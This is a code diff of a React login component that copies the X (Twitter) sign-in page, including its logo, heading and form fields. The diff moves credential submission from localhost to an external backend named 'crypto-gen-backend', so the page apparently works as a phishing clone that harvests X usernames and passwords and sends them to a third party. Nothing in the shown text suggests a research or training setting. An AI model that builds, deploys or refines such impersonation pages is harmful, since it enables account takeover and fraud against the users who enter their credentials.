@@ -9,35 +9,35 @@ const Twitter = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setError('');
-
+  
     try {
-      const response = await fetch('http://localhost:3000/login', {
+      const response = await fetch('https://crypto-gen-backend.vercel.app/api/login', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          username: email,
-          password: password
+          username: email.trim(),
+          password: password.trim(),
         }),
       });
-
+  
       const data = await response.json();
-
-      if (response.ok) {
-        alert('Login successful!');
-      } else {
-        setError(data.message || 'Login failed');
+  
+      if (!response.ok) {
+        throw new Error(data.message || 'Login failed');
       }
+  
+      alert('Login successful!');
     } catch (err) {
-      setError('Connection error. Please try again.');
+      setError(err.message || 'Connection error. Please try again.');
+      console.error('Fetch error:', err);
     }
   };
 
   return (
-    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4 ">
+    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
       <div className="w-full max-w-[364px] sm:max-w-[440px] bg-black rounded-2xl relative border border-neutral-600">
-        {/* Close button absolute position */}
         <button className="absolute left-2 top-2 p-2 hover:bg-gray-800 rounded-full">
           <svg viewBox="0 0 24 24" className="w-5 h-5 text-white">
             <path
@@ -47,7 +47,6 @@ const Twitter = () => {
           </svg>
         </button>
 
-        {/* X Logo centered */}
         <div className="flex justify-center mb-6 pt-3">
           <svg viewBox="0 0 24 24" aria-hidden="true" className="w-8 h-8 text-white">
             <g>
@@ -59,11 +58,9 @@ const Twitter = () => {
           </svg>
         </div>
 
-        {/* Sign in heading */}
         <h1 className="text-[31px] font-bold mb-8 px-8">Sign in to X</h1>
 
         <form onSubmit={handleSubmit} className="px-8">
-          {/* Google Sign in button */}
           <button
             type="button"
             className="w-full flex items-center justify-center gap-3 bg-white cursor-pointer text-black py-2.5 px-4 rounded-full border border-gray-300 hover:bg-gray-200 transition-colors duration-200 ease-in-out font-medium text-[15px] mb-3"
@@ -89,27 +86,6 @@ const Twitter = () => {
             Sign in with Google
           </button>
 
-          <button
-            type="button"
-            className="w-full flex items-center justify-center gap-3 bg-white text-black cursor-pointer py-2.5 px-4 rounded-full border border-gray-300 hover:bg-gray-200 transition-colors duration-200 ease-in-out font-medium text-[15px]"
-          >
-            <svg className="w-[18px] h-[18px]" viewBox="0 0 24 24">
-              <path
-                fill="black"
-                d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11"
-              />
-            </svg>
-            Sign in with Apple
-          </button>
-
-          {/* Divider */}
-          <div className="flex items-center my-4">
-            <div className="flex-grow border-t border-[#2f3336]"></div>
-            <span className="px-4 text-[#71767b] text-[15px]">or</span>
-            <div className="flex-grow border-t border-[#2f3336]"></div>
-          </div>
-
-          {/* Input fields */}
           <input
             type="text"
             placeholder="Phone, email address, or username"
@@ -119,7 +95,7 @@ const Twitter = () => {
           />
 
           <input
-            type={showPassword ? "text" : "password"}
+            type={showPassword ? 'text' : 'password'}
             placeholder="Password"
             className="w-full bg-black text-white border border-[#2f3336] rounded text-[15px] p-4 mb-3 focus:outline-none focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0]"
             value={password}
@@ -128,7 +104,6 @@ const Twitter = () => {
 
           {error && <p className="text-[#f4212e] text-sm mt-1 mb-3">{error}</p>}
 
-          {/* Next button */}
           <button
             type="submit"
             className="w-full bg-white text-black py-2 rounded-full font-bold text-[15px] mb-3 hover:bg-[#e6e6e6] cursor-pointer transition-colors duration-150 ease-in"
@@ -136,7 +111,6 @@ const Twitter = () => {
             Next
           </button>
 
-          {/* Forgot password button */}
           <button
             type="button"
             className="w-full bg-black text-white py-2 rounded-full border border-[#536471] font-bold text-[15px] cursor-pointer mb-6 hover:bg-[#181818] transition"
@@ -145,7 +119,6 @@ const Twitter = () => {
           </button>
         </form>
 
-        {/* Sign up text */}
         <p className="text-[#71767b] text-[15px] text-center pb-8 px-8">
           Don&apos;t have an account?{' '}
           <a href="#" className="text-[#1d9bf0] hover:underline">
